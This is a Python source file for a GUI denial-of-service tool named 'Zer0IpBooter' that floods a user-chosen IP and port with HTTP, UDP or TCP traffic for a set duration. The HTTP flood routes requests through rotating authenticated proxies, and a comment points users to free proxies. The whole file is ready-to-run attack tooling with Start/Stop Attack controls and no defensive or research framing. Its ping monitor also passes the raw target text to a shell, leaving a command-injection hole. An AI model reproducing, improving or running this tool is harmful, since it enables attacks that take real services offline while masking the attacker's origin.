import sys
import asyncio
import random
import time
import threading
import logging
import subprocess
import socket
import aiohttp
from aiohttp import BasicAuth
from PyQt5.QtWidgets import (QApplication, QMainWindow, QPushButton, QTextEdit, QVBoxLayout, QWidget, QLabel, QLineEdit)
from PyQt5.QtGui import QPalette, QColor, QFont, QLinearGradient
from PyQt5.QtCore import Qt, QTimer, QThread, pyqtSignal

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class WorkerThread(QThread):
    log_signal = pyqtSignal(str)

    def __init__(self, attack_type, target_ip, target_port, duration, proxies):
        super().__init__()
        self.attack_type = attack_type
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.proxies = proxies
        self.packet_count = 0
        self.packet_size = 1024
        self.stop_event = threading.Event()
        self.start_time = time.time()

    async def http_flood(self):
        end_time = self.start_time + self.duration
        request_url = f"http://{self.target_ip}:{self.target_port}/"
        async with aiohttp.ClientSession() as session:
            while time.time() < end_time and not self.stop_event.is_set():
                try:
                    proxy = random.choice(self.proxies)
                    proxy_ip, proxy_port, proxy_user, proxy_pass = proxy.split(':')
                    proxy_url = f"http://{proxy_ip}:{proxy_port}"
                    proxy_auth = BasicAuth(proxy_user, proxy_pass)
                    
                    async with session.get(request_url, proxy=proxy_url, proxy_auth=proxy_auth) as response:
                        if response.status == 200:
                            self.packet_count += 1
                            self.log_signal.emit(f"HTTP flood request sent via proxy {proxy} to {self.target_ip}:{self.target_port} | Packet Size: {self.packet_size} bytes")
                        else:
                            self.log_signal.emit(f"Failed HTTP flood request via proxy {proxy} | Response Status: {response.status}")
                except Exception as e:
                    self.log_signal.emit(f"Error sending HTTP flood request: {e}")
                await asyncio.sleep(0.5)

    def udp_flood(self):
        end_time = self.start_time + self.duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time and not self.stop_event.is_set():
            try:
                message = b'\x00' * self.packet_size
                sock.sendto(message, (self.target_ip, self.target_port))
                self.packet_count += 1
                self.log_signal.emit(f"UDP flood packet sent to {self.target_ip}:{self.target_port} | Packet Size: {self.packet_size} bytes")
            except Exception as e:
                self.log_signal.emit(f"Error sending UDP flood packet: {e}")
            time.sleep(0.5)
        sock.close()
        total_size_bytes = self.packet_count * self.packet_size
        total_size_gb = total_size_bytes / 1_073_741_824
        self.log_signal.emit(f"UDP flood attack finished. Total packets sent: {self.packet_count} | Total size: {total_size_gb:.5f} GB")

    def tcp_flood(self):
        end_time = self.start_time + self.duration
        while time.time() < end_time and not self.stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target_ip, self.target_port))
                sock.send(b'\x00' * self.packet_size)
                self.packet_count += 1
                self.log_signal.emit(f"TCP flood packet sent to {self.target_ip}:{self.target_port} | Packet Size: {self.packet_size} bytes")
                sock.close()
            except (socket.timeout, ConnectionRefusedError) as e:
                self.log_signal.emit(f"Error sending TCP flood packet: {e}")
            except Exception as e:
                self.log_signal.emit(f"Unexpected error: {e}")
            time.sleep(0.5)
        total_size_bytes = self.packet_count * self.packet_size
        total_size_gb = total_size_bytes / 1_073_741_824
        self.log_signal.emit(f"TCP flood attack finished. Total packets sent: {self.packet_count} | Total size: {total_size_gb:.5f} GB")

    def run(self):
        if self.attack_type == 'http':
            asyncio.run(self.http_flood())
        elif self.attack_type == 'udp':
            self.udp_flood()
        elif self.attack_type == 'tcp':
            self.tcp_flood()
        else:
            self.log_signal.emit("Unsupported attack type.")
        self.log_signal.emit("Attack finished.")

    def stop(self):
        self.stop_event.set()
        self.log_signal.emit("Stopping attack...")

class PingThread(QThread):
    ping_signal = pyqtSignal(str)

    def __init__(self, target_ip):
        super().__init__()
        self.target_ip = target_ip
        self.stop_event = threading.Event()

    def run(self):
        while not self.stop_event.is_set():
            try:
                output = subprocess.check_output(f'ping {self.target_ip} -n 1', shell=True).decode()
                lines = output.split('\n')
                for line in lines:
                    if "time=" in line:
                        ping_time = line.split('time=')[1].split('ms')[0]
                        self.ping_signal.emit(f"Ping: {ping_time} ms")
                        break
                time.sleep(1)
            except subprocess.CalledProcessError as e:
                self.ping_signal.emit(f"Ping error: {e}")
            except Exception as e:
                self.ping_signal.emit(f"Unexpected error: {e}")

    def stop(self):
        self.stop_event.set()

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Zer0IpBooter")
        self.setGeometry(100, 100, 800, 600)
        self.setStyleSheet("background-color: #2E2E2E; color: #FFFFFF;")
        self.init_ui()
        self.setup_background_animation()

    def init_ui(self):
        layout = QVBoxLayout()

        self.target_ip_input = QLineEdit()
        self.target_ip_input.setPlaceholderText("Enter target IP")
        layout.addWidget(self.target_ip_input)

        self.target_port_input = QLineEdit()
        self.target_port_input.setPlaceholderText("Enter target port")
        layout.addWidget(self.target_port_input)

        self.attack_type_input = QLineEdit()
        self.attack_type_input.setPlaceholderText("Enter attack type (http, udp, tcp)")
        layout.addWidget(self.attack_type_input)

        self.duration_input = QLineEdit()
        self.duration_input.setPlaceholderText("Enter attack duration in seconds")
        layout.addWidget(self.duration_input)

        self.start_button = QPushButton("Start Attack")
        self.start_button.setStyleSheet("background-color: #007BFF; color: #FFFFFF; border: none; padding: 10px; border-radius: 5px;")
        self.start_button.clicked.connect(self.start_attack)
        layout.addWidget(self.start_button)

        self.stop_button = QPushButton("Stop Attack")
        self.stop_button.setStyleSheet("background-color: #DC3545; color: #FFFFFF; border: none; padding: 10px; border-radius: 5px;")
        self.stop_button.clicked.connect(self.stop_attack)
        layout.addWidget(self.stop_button)

        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("background-color: #333333; color: #FFFFFF; border: none; padding: 10px; border-radius: 5px;")
        layout.addWidget(self.log_output)

        self.ping_display = QLabel("Ping: Not Available")
        self.ping_display.setStyleSheet("font-size: 18px; color: #FF0000; padding: 10px; border-radius: 5px; background-color: #333333;")
        layout.addWidget(self.ping_display)

        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)

        self.attack_thread = None
        self.ping_thread = None

    def setup_background_animation(self):
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_background)
        self.timer.start(50)
        self.hue = 0

    def update_background(self):
        self.hue = (self.hue + 1) % 360
        gradient = QLinearGradient(0, 0, self.width(), self.height())
        gradient.setColorAt(0, QColor.fromHsl(self.hue, 255, 127))
        gradient.setColorAt(1, QColor.fromHsl((self.hue + 120) % 360, 255, 127))
        palette = QPalette()
        palette.setBrush(QPalette.Background, gradient)
        self.setPalette(palette)

    def start_attack(self):
        target_ip = self.target_ip_input.text().strip()
        target_port_str = self.target_port_input.text().strip()
        attack_type = self.attack_type_input.text().strip().lower()
        duration_str = self.duration_input.text().strip()

        if not target_ip or not target_port_str or not attack_type or not duration_str:
            self.log_output.append("Please fill all fields.")
            return

        try:
            target_port = int(target_port_str)
            duration = int(duration_str)
        except ValueError:
            self.log_output.append("Invalid port or duration value.")
            return

        if self.attack_thread and self.attack_thread.isRunning():
            self.attack_thread.stop()
            self.attack_thread.wait()
        if self.ping_thread and self.ping_thread.isRunning():
            self.ping_thread.stop()
            self.ping_thread.wait()

        self.attack_thread = WorkerThread(attack_type, target_ip, target_port, duration, [
            "IP:PORT:USERNAME:PASSWORD",                                                    #CHANGE THE PROXYSERVERS OR HERE GET THEM FROM WEBSHARE.IO FOR  FREE!
            "IP:PORT:USERNAME:PASSWORD",
            "IP:PORT:USERNAME:PASSWORD",
            "IP:PORT:USERNAME:PASSWORD",
            "IP:PORT:USERNAME:PASSWORD",
            "IP:PORT:USERNAME:PASSWORD",
            "IP:PORT:USERNAME:PASSWORD",
            "IP:PORT:USERNAME:PASSWORD",
            "IP:PORT:USERNAME:PASSWORD",
            "IP:PORT:USERNAME:PASSWORD",
        ])
        self.attack_thread.log_signal.connect(self.log_output.append)
        self.attack_thread.start()

        self.ping_thread = PingThread(target_ip)
        self.ping_thread.ping_signal.connect(self.ping_display.setText)
        self.ping_thread.start()

    def stop_attack(self):
        if self.attack_thread and self.attack_thread.isRunning():
            self.attack_thread.stop()
            self.attack_thread.wait()
        if self.ping_thread and self.ping_thread.isRunning():
            self.ping_thread.stop()
            self.ping_thread.wait()

def main():
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
